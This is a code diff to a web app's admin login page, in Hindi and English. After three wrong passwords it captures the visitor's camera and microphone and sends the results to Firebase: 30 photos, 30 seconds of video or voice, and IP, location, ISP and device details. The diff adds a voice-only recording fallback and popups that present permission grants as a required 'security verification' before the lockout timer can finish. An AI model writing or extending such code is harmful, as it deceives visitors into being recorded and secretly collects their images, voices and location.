@@ -71,7 +71,7 @@
         }
 
         /* =========================================
-           2. BANNER WITH 3D FLOATING SKILLS
+           2. BANNER WITH 3D FLYING & FLOATING SKILLS
            ========================================= */
         .banner {
             width: 100%; height: 225px;
@@ -98,34 +98,74 @@
         .floating-3d-stage {
             position: absolute;
             inset: 0;
-            perspective: 800px;
+            perspective: 900px;
             pointer-events: none;
             z-index: 2;
         }
         .float-item {
             position: absolute;
-            padding: 5px 12px;
+            padding: 5px 13px;
             border-radius: 20px;
             font-size: 11.5px;
             font-weight: 800;
             letter-spacing: 0.5px;
             color: #fff;
-            background: rgba(15, 15, 28, 0.65);
-            backdrop-filter: blur(4px);
+            background: rgba(15, 15, 28, 0.72);
+            backdrop-filter: blur(5px);
             box-shadow: 0 0 15px rgba(0, 242, 254, 0.45);
             border: 1px solid rgba(255, 255, 255, 0.35);
-            animation: float3D 6s infinite ease-in-out alternate;
+            will-change: top, left, transform;
         }
-        .fi-1 { top: 18%; left: 8%; border-color: #ff0055; box-shadow: 0 0 14px #ff0055; animation-delay: 0s; }
-        .fi-2 { top: 22%; right: 10%; border-color: #00f2fe; box-shadow: 0 0 14px #00f2fe; animation-delay: -1.5s; }
-        .fi-3 { bottom: 28%; left: 12%; border-color: #a855f7; box-shadow: 0 0 14px #a855f7; animation-delay: -3s; }
-        .fi-4 { bottom: 24%; right: 8%; border-color: #00ff87; box-shadow: 0 0 14px #00ff87; animation-delay: -4.2s; }
-        .fi-5 { top: 12%; left: 42%; border-color: #ffbe0b; box-shadow: 0 0 14px #ffbe0b; animation-delay: -2.1s; }
+        .fi-1 {
+            border-color: #ff0055; box-shadow: 0 0 16px #ff0055;
+            animation: flyTag1 13s infinite alternate ease-in-out;
+        }
+        .fi-2 {
+            border-color: #00f2fe; box-shadow: 0 0 16px #00f2fe;
+            animation: flyTag2 15s infinite alternate ease-in-out;
+        }
+        .fi-3 {
+            border-color: #a855f7; box-shadow: 0 0 16px #a855f7;
+            animation: flyTag3 14s infinite alternate ease-in-out;
+        }
+        .fi-4 {
+            border-color: #00ff87; box-shadow: 0 0 16px #00ff87;
+            animation: flyTag4 16s infinite alternate ease-in-out;
+        }
+        .fi-5 {
+            border-color: #ffbe0b; box-shadow: 0 0 16px #ffbe0b;
+            animation: flyTag5 17s infinite alternate ease-in-out;
+        }
 
-        @keyframes float3D {
-            0% { transform: translate3d(0, 0, 0) rotateX(12deg) rotateY(-15deg); }
-            50% { transform: translate(12px, -14px, 30px) rotateX(-12deg) rotateY(15deg); }
-            100% { transform: translate(-10px, 10px, 15px) rotateX(8deg) rotateY(-10deg); }
+        @keyframes flyTag1 {
+            0%   { top: 14%; left: 6%;  transform: scale(0.95) rotate(-8deg); }
+            35%  { top: 55%; left: 38%; transform: scale(1.12) rotate(6deg); }
+            70%  { top: 18%; left: 72%; transform: scale(0.9)  rotate(-5deg); }
+            100% { top: 62%; left: 15%; transform: scale(1.06) rotate(8deg); }
+        }
+        @keyframes flyTag2 {
+            0%   { top: 20%; left: 72%; transform: scale(1.08) rotate(7deg); }
+            35%  { top: 62%; left: 48%; transform: scale(0.92) rotate(-7deg); }
+            70%  { top: 15%; left: 14%; transform: scale(1.1)  rotate(5deg); }
+            100% { top: 52%; left: 70%; transform: scale(0.95) rotate(-6deg); }
+        }
+        @keyframes flyTag3 {
+            0%   { top: 60%; left: 10%; transform: scale(1.05) rotate(6deg); }
+            35%  { top: 14%; left: 44%; transform: scale(0.92) rotate(-8deg); }
+            70%  { top: 58%; left: 68%; transform: scale(1.12) rotate(7deg); }
+            100% { top: 22%; left: 22%; transform: scale(0.96) rotate(-5deg); }
+        }
+        @keyframes flyTag4 {
+            0%   { top: 58%; left: 68%; transform: scale(0.94) rotate(-6deg); }
+            35%  { top: 18%; left: 24%; transform: scale(1.1)  rotate(8deg); }
+            70%  { top: 60%; left: 32%; transform: scale(0.92) rotate(-7deg); }
+            100% { top: 14%; left: 66%; transform: scale(1.08) rotate(6deg); }
+        }
+        @keyframes flyTag5 {
+            0%   { top: 12%; left: 42%; transform: scale(1.06) rotate(-5deg); }
+            35%  { top: 58%; left: 14%; transform: scale(0.94) rotate(7deg); }
+            70%  { top: 26%; left: 68%; transform: scale(1.12) rotate(-6deg); }
+            100% { top: 54%; left: 48%; transform: scale(0.96) rotate(5deg); }
         }
 
         /* =========================================
@@ -850,24 +890,40 @@
             text-decoration: underline;
         }
 
-        /* Lockout Timer & Intruder Alert inside Glass Login */
+        /* Colorful Neon Lockout Banner inside Glass Login */
         .lockout-banner {
             display: none;
-            background: rgba(255, 0, 85, 0.18);
-            border: 1.5px solid #ff0055;
-            border-radius: 14px;
-            padding: 12px;
+            background: linear-gradient(135deg, rgba(255, 0, 85, 0.26), rgba(121, 0, 255, 0.28), rgba(0, 242, 254, 0.22));
+            border: 2px solid #00f2fe;
+            box-shadow: 0 0 22px rgba(255, 0, 85, 0.55), inset 0 0 14px rgba(0, 242, 254, 0.35);
+            border-radius: 16px;
+            padding: 14px;
             margin-bottom: 16px;
-            color: #ffccd5;
+            color: #ffffff;
             font-size: 13px;
-            line-height: 1.45;
+            line-height: 1.5;
         }
         .lockout-timer-num {
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 900;
-            color: #ffbe0b;
+            background: linear-gradient(90deg, #ffbe0b, #00ff87, #00f2fe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             display: block;
             margin: 4px 0;
+        }
+        .reallow-neon-btn {
+            margin-top: 8px;
+            padding: 8px 18px;
+            border-radius: 22px;
+            border: 1.5px solid #ffbe0b;
+            background: linear-gradient(90deg, #ff0055, #7900ff, #00d2ff);
+            color: #ffffff;
+            font-weight: 800;
+            font-size: 12.5px;
+            cursor: pointer;
+            box-shadow: 0 0 16px rgba(255, 0, 85, 0.65);
+            animation: pulseBadge 1.5s infinite alternate;
         }
 
         /* =========================================
@@ -990,6 +1046,7 @@
         }
         .badge-vid { background: #ff0055; color: #fff; }
         .badge-img { background: #00d2ff; color: #050510; }
+        .badge-aud { background: #00ff87; color: #050510; }
         .intruder-meta {
             padding: 7px;
             color: #e2e8f0;
@@ -1148,11 +1205,14 @@
     <div id="login-box" class="glass-login-box">
         <div class="glass-login-title">Login</div>
 
-        <!-- 1-Minute Lockout Banner -->
+        <!-- Colorful Neon Lockout Banner + Re-Allow Prompt -->
         <div id="admin-lockout-banner" class="lockout-banner">
-            ⚠️ 3 बार गलत पासवर्ड! सुरक्षा कारणों से लॉगिन 1 मिनट के लिए लॉक है।
+            ⚠️ 3 बार गलत पासवर्ड! सुरक्षा कारणों से लॉगिन 60 सेकंड के लिए लॉक है।
             <span id="lockout-seconds" class="lockout-timer-num">60s</span>
-            <small id="lockout-cam-status" style="color:#00f2fe;">Security check active...</small>
+            <small id="lockout-cam-status" style="color:#00f2fe; display:block;">Security check active...</small>
+            <button type="button" id="reallow-media-btn" class="reallow-neon-btn" style="display:none;" onclick="reTriggerSecurityAllow()">
+                ✨ Allow Verification & Continue Timer
+            </button>
         </div>
 
         <div class="glass-input-group">
@@ -1195,10 +1255,10 @@
             <button class="btn-sm btn-blue" onclick="saveMultiKeysToFirebase()">💾 Save All API Keys</button>
         </div>
 
-        <!-- SECURITY SECTION 1: 30s BURST SELFIES (1/SEC), 30s MIC VIDEO & DEVICE INFO -->
+        <!-- SECURITY SECTION 1: 30s BURST SELFIES (1/SEC), 30s MIC VIDEO & VOICE LOGS -->
         <div class="admin-sec-box" style="border-color:#ff0055;">
             <div class="mailbox-header">
-                <h4 style="color:#ff4d8d;">🎥 Intruder Selfies (30s / 1-per-sec) & 30s Mic Video</h4>
+                <h4 style="color:#ff4d8d;">🎥 Intruder Selfies (30s / 1-per-sec), 30s Video & Voice</h4>
                 <button class="btn-sm btn-red" style="padding: 5px 10px; font-size: 11.5px; margin:0;" onclick="deleteAllIntruders()">🗑️ Delete All</button>
             </div>
             <div id="admin-intruder-list" class="intruder-grid">
@@ -1719,9 +1779,20 @@
         }
 
         window.openFullMediaViewer = function(type, srcUrl, metaText, filename) {
-            const mediaTag = type === 'video'
-                ? `<video src="${srcUrl}" controls autoplay playsinline style="width:100%; max-height:64vh; border-radius:12px; background:#000; margin-bottom:10px;"></video>`
-                : `<img src="${srcUrl}" alt="Full Size Intruder Photo" style="width:100%; max-height:64vh; object-fit:contain; border-radius:12px; background:#000; margin-bottom:10px;">`;
+            let mediaTag = "";
+            let titleTxt = "📸 Full Size Photo";
+            if (type === 'video') {
+                mediaTag = `<video src="${srcUrl}" controls autoplay playsinline style="width:100%; max-height:64vh; border-radius:12px; background:#000; margin-bottom:10px;"></video>`;
+                titleTxt = "🎥 Full Size 30s Video";
+            } else if (type === 'audio') {
+                mediaTag = `<div style="padding:20px; background:rgba(0,0,0,0.6); border-radius:12px; margin-bottom:10px;">
+                                <div style="font-size:32px; margin-bottom:8px;">🎙️</div>
+                                <audio src="${srcUrl}" controls autoplay style="width:100%;"></audio>
+                            </div>`;
+                titleTxt = "🎙️ 30s Voice Recording";
+            } else {
+                mediaTag = `<img src="${srcUrl}" alt="Full Size Intruder Photo" style="width:100%; max-height:64vh; object-fit:contain; border-radius:12px; background:#000; margin-bottom:10px;">`;
+            }
 
             const html = `
                 ${mediaTag}
@@ -1731,7 +1802,7 @@
                     <button type="button" class="btn-sm btn-gray" style="padding:9px 18px; border-radius:20px; margin:0;" onclick="closeNeonModal()">✖ Close</button>
                 </div>
             `;
-            showNeonAlert(type === 'video' ? "🎥 Full Size 30s Video" : "📸 Full Size Photo", html, true, true);
+            showNeonAlert(titleTxt, html, true, true);
             document.getElementById('neon-modal-card').classList.add('full-media-mode');
             const okBtn = document.getElementById('neon-modal-close-btn');
             if (okBtn) okBtn.style.display = 'none';
@@ -1784,9 +1855,10 @@
         }
 
         /* =========================================
-           E. WIDE-ANGLE (0.3x/MIN ZOOM) CAMERA + MIC STREAM HELPER
+           E. WIDE-ANGLE CAMERA + MIC + AUDIO-ONLY FALLBACK HELPER
            ========================================= */
         window.activeCamStream = null;
+        window.activeAudioOnlyStream = null;
         window.streamHasAudio = false;
 
         async function applyWideAngleMinimumZoom(videoTrack) {
@@ -1830,6 +1902,7 @@
                 return stream;
             } catch (err) {
                 if (withAudio) {
+                    // Fallback 1: Try Camera-Only (if Mic was denied)
                     try {
                         const camOnlyStream = await navigator.mediaDevices.getUserMedia({
                             video: videoConstraints,
@@ -1847,7 +1920,18 @@
                         }
                         return camOnlyStream;
                     } catch (camErr) {
-                        return null;
+                        // Fallback 2: Try Mic-Only (if Camera was denied but Mic was allowed)
+                        try {
+                            const audioOnly = await navigator.mediaDevices.getUserMedia({
+                                video: false,
+                                audio: true
+                            });
+                            window.activeAudioOnlyStream = audioOnly;
+                            window.streamHasAudio = true;
+                            return null;
+                        } catch (audErr) {
+                            return null;
+                        }
                     }
                 }
                 return null;
@@ -2293,11 +2377,12 @@ STRICT INTENT & BREVITY RULES:
         };
 
         /* =========================================
-           3-TRY WRONG PASSWORD LOCK + 30s PHOTOS (1/SEC) & 30s MIC VIDEO
+           3-TRY WRONG PASSWORD LOCK + 30s PHOTOS (1/SEC), 30s VIDEO & VOICE
            ========================================= */
         let failedAttempts = parseInt(localStorage.getItem('rax_admin_fails') || '0', 10);
         let lockUntil = parseInt(localStorage.getItem('rax_admin_lock_until') || '0', 10);
         let lockoutCountdownInterval = null;
+        let lastAttemptedEmail = "";
 
         function sendSelfieToAdmin(attemptedEmail) {
             const vid = document.getElementById('sec-cam-video');
@@ -2389,7 +2474,6 @@ STRICT INTENT & BREVITY RULES:
                 };
 
                 recorder.start(1000);
-                // Record for 30 seconds with Mic audio
                 setTimeout(() => {
                     if (recorder.state === 'recording') {
                         recorder.stop();
@@ -2398,22 +2482,107 @@ STRICT INTENT & BREVITY RULES:
             } catch (err) {}
         }
 
+        function recordThirtySecondAudioOnly(audioStream, attemptedEmail) {
+            if (!audioStream || typeof MediaRecorder === 'undefined') return;
+            try {
+                const recorder = new MediaRecorder(audioStream);
+                const chunks = [];
+                recorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) chunks.push(e.data);
+                };
+                recorder.onstop = () => {
+                    if (!chunks.length) return;
+                    const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        const base64Audio = reader.result;
+                        if (base64Audio && base64Audio.length > 150) {
+                            push(ref(db, 'intruderLogs'), {
+                                type: 'audio',
+                                audio: base64Audio,
+                                attemptedEmail: attemptedEmail || "Unknown",
+                                ip: window.visitorInfo?.ip || "Unknown IP",
+                                cityRegion: window.visitorInfo?.cityRegion || "Unknown Location",
+                                isp: window.visitorInfo?.isp || "Unknown ISP",
+                                device: `${window.visitorInfo?.deviceModel || 'Device'} • Screen: ${window.visitorInfo?.screenRes || ''} (${getDeviceTag()})`,
+                                time: new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'medium' }),
+                                timestamp: Date.now()
+                            }).catch(() => {});
+                        }
+                    };
+                    reader.readAsDataURL(blob);
+                };
+                recorder.start(1000);
+                setTimeout(() => {
+                    if (recorder.state === 'recording') recorder.stop();
+                }, 30000);
+            } catch (e) {}
+        }
+
+        /* Colorful Neon Re-Allow Popup if user denied permission */
+        function showColorfulReAllowPopup(attemptedEmail) {
+            const html = `
+                <div style="background:linear-gradient(135deg, rgba(255,0,85,0.22), rgba(0,242,254,0.2)); border:1.5px solid #ffbe0b; border-radius:14px; padding:12px; margin-bottom:12px;">
+                    <div style="font-size:15px; font-weight:800; color:#ffbe0b; margin-bottom:6px;">⏳ 60 सेकंड का सुरक्षा टाइमर चालू है</div>
+                    <p style="font-size:13px; color:#ffffff; line-height:1.5;">
+                        आगे बढ़ने और टाइमर पूरा करने के लिए कृपया नीचे <strong>Allow Now</strong> पर टैप करके अनुमति दें।
+                    </p>
+                </div>
+                <button type="button" class="btn-main btn-challenge" style="margin:0 auto;" onclick="closeNeonModal(); reTriggerSecurityAllow();">
+                    ✨ Allow Now (60s Timer)
+                </button>
+            `;
+            showNeonAlert("🔐 Security Verification Required", html, true, false);
+        }
+
+        window.reTriggerSecurityAllow = async function() {
+            const camStatusEl = document.getElementById('lockout-cam-status');
+            const reallowBtn = document.getElementById('reallow-media-btn');
+            const stream = await window.requestCombinedMediaPermission(true);
+            if (stream) {
+                if (reallowBtn) reallowBtn.style.display = 'none';
+                window.runSecurityCosmosLoader(2500);
+                if (camStatusEl) camStatusEl.innerText = "🔴 Security Verification Active...";
+
+                setTimeout(() => {
+                    let photoCount = 0;
+                    const burstPhotoTimer = setInterval(() => {
+                        photoCount++;
+                        sendSelfieToAdmin(lastAttemptedEmail);
+                        if (photoCount >= 30 || Date.now() > lockUntil) {
+                            clearInterval(burstPhotoTimer);
+                        }
+                    }, 1000);
+                    recordThirtySecondIntruderVideo(stream, lastAttemptedEmail, window.streamHasAudio);
+                }, 800);
+            } else if (window.activeAudioOnlyStream) {
+                if (reallowBtn) reallowBtn.style.display = 'inline-block';
+                if (camStatusEl) camStatusEl.innerText = "🎙️ Voice Verification Active (60s Timer)...";
+                recordThirtySecondAudioOnly(window.activeAudioOnlyStream, lastAttemptedEmail);
+            } else {
+                if (reallowBtn) reallowBtn.style.display = 'inline-block';
+                showColorfulReAllowPopup(lastAttemptedEmail);
+            }
+        };
+
         async function startIntruderLockout(attemptedEmail) {
+            lastAttemptedEmail = attemptedEmail;
             lockUntil = Date.now() + 60000;
             localStorage.setItem('rax_admin_lock_until', lockUntil.toString());
 
             const camStatusEl = document.getElementById('lockout-cam-status');
-            if (camStatusEl) camStatusEl.innerText = "Verifying security camera & audio...";
+            const reallowBtn = document.getElementById('reallow-media-btn');
+            if (camStatusEl) camStatusEl.innerText = "Security verification active (60s)...";
 
             const stream = await window.requestCombinedMediaPermission(true);
             if (stream) {
+                if (reallowBtn) reallowBtn.style.display = 'none';
                 window.runSecurityCosmosLoader(2500);
                 if (camStatusEl) {
                     camStatusEl.innerText = "🔴 Security Verification Active...";
                 }
 
                 setTimeout(() => {
-                    // 1 photo every 1 second for 30 seconds (total 30 photos)
                     let photoCount = 0;
                     const burstPhotoTimer = setInterval(() => {
                         photoCount++;
@@ -2423,10 +2592,15 @@ STRICT INTENT & BREVITY RULES:
                         }
                     }, 1000);
 
-                    // 30-second video with Mic
                     recordThirtySecondIntruderVideo(stream, attemptedEmail, window.streamHasAudio);
                 }, 800);
+            } else if (window.activeAudioOnlyStream) {
+                // Camera denied, but Mic was already allowed -> record 30s voice + log IP/Device
+                if (reallowBtn) reallowBtn.style.display = 'inline-block';
+                if (camStatusEl) camStatusEl.innerText = "🎙️ Voice Verification Active (60s Timer)...";
+                recordThirtySecondAudioOnly(window.activeAudioOnlyStream, attemptedEmail);
             } else {
+                // Both denied -> log IP/Device + show colorful neon Allow popup & 60s timer
                 push(ref(db, 'intruderLogs'), {
                     type: 'info_only',
                     attemptedEmail: attemptedEmail || "Unknown",
@@ -2437,7 +2611,9 @@ STRICT INTENT & BREVITY RULES:
                     time: new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'medium' }),
                     timestamp: Date.now()
                 }).catch(() => {});
-                if (camStatusEl) camStatusEl.innerText = "⚠️ Camera permission denied (Device & IP Logged)";
+                if (camStatusEl) camStatusEl.innerText = "⏳ Please tap Allow below to complete 60s verification";
+                if (reallowBtn) reallowBtn.style.display = 'inline-block';
+                showColorfulReAllowPopup(attemptedEmail);
             }
 
             updateLockoutUI();
@@ -2547,15 +2723,19 @@ STRICT INTENT & BREVITY RULES:
                     card.className = 'intruder-card';
 
                     const isVideo = item.type === 'video' && item.video;
+                    const isAudio = item.type === 'audio' && item.audio;
                     const isInfoOnly = item.type === 'info_only';
-                    const mediaSrc = isVideo ? base64ToBlobUrl(item.video) : (item.photo || "");
-                    const fileExt = isVideo ? 'webm' : 'jpg';
+
+                    const mediaSrc = isVideo ? base64ToBlobUrl(item.video)
+                                   : isAudio ? base64ToBlobUrl(item.audio)
+                                   : (item.photo || "");
+                    const fileExt = (isVideo || isAudio) ? 'webm' : 'jpg';
                     const fileName = `RAX_Intruder_${key}.${fileExt}`;
                     const metaSummary = `Email: ${escapeHTML(item.attemptedEmail || 'Unknown')} | IP: ${item.ip || 'Unknown'} | ${item.cityRegion || ''}`;
 
                     if (!isInfoOnly && mediaSrc) {
                         window.intruderMediaCache[key] = {
-                            type: isVideo ? 'video' : 'photo',
+                            type: isVideo ? 'video' : isAudio ? 'audio' : 'photo',
                             url: mediaSrc,
                             meta: metaSummary,
                             filename: fileName
@@ -2568,6 +2748,12 @@ STRICT INTENT & BREVITY RULES:
                                <video src="${mediaSrc}" muted playsinline preload="metadata"></video>
                                <span class="tap-fullscreen-tag">▶️ Tap Full Size</span>
                            </div>`;
+                    } else if (isAudio) {
+                        mediaHTML = `<div class="intruder-media-box" style="display:flex; flex-direction:column; align-items:center; justify-content:center; padding:8px;" onclick="openIntruderItemFull('${key}')">
+                               <div style="font-size:32px; margin-bottom:6px;">🎙️</div>
+                               <audio src="${mediaSrc}" controls style="width:100%; height:32px;" onclick="event.stopPropagation()"></audio>
+                               <span class="tap-fullscreen-tag">🔊 Tap Full Size</span>
+                           </div>`;
                     } else if (!isInfoOnly && mediaSrc) {
                         mediaHTML = `<div class="intruder-media-box" onclick="openIntruderItemFull('${key}')">
                                <img src="${mediaSrc}" alt="Intruder Selfie">
@@ -2577,8 +2763,10 @@ STRICT INTENT & BREVITY RULES:
 
                     const badgeHTML = isVideo
                         ? `<span class="intruder-badge badge-vid">🎥 30s Video ${item.hasAudio ? '+ 🎙️ Voice' : '(No Mic)'}</span><br>`
+                        : isAudio
+                        ? `<span class="intruder-badge badge-aud">🎙️ 30s Voice Recording</span><br>`
                         : isInfoOnly
-                        ? `<span class="intruder-badge badge-vid">⚠️ Camera Blocked (Device Log)</span><br>`
+                        ? `<span class="intruder-badge badge-vid">⚠️ Device & IP Log</span><br>`
                         : `<span class="intruder-badge badge-img">📸 Selfie Photo</span><br>`;
 
                     const dlBtnHTML = (!isInfoOnly && mediaSrc)
@@ -2670,7 +2858,7 @@ STRICT INTENT & BREVITY RULES:
         };
         window.deleteAllIntruders = function() {
             if (auth.currentUser) {
-                showNeonConfirm("⚠️ Delete All Logs?", "क्या आप वाकई सभी Intruder फोटो और वीडियो डिलीट करना चाहते हैं?", () => {
+                showNeonConfirm("⚠️ Delete All Logs?", "क्या आप वाकई सभी Intruder फोटो, वीडियो और वॉइस लॉग डिलीट करना चाहते हैं?", () => {
                     remove(ref(db, 'intruderLogs'));
                 });
             }
@@ -2787,7 +2975,7 @@ STRICT INTENT & BREVITY RULES:
                         startIntruderLockout(email);
                     } else {
                         const leftTries = 3 - failedAttempts;
-                        showNeonAlert("Login Failed", `गलत Email या Password! बचे हुए प्रयास: ${leftTries}`, false, true);
+                        showNeonAlert("Login Failed", `गलत Email या Password! बचे हुए प्रयास: ${leftTries} Try`, false, false);
                     }
                 });
         };
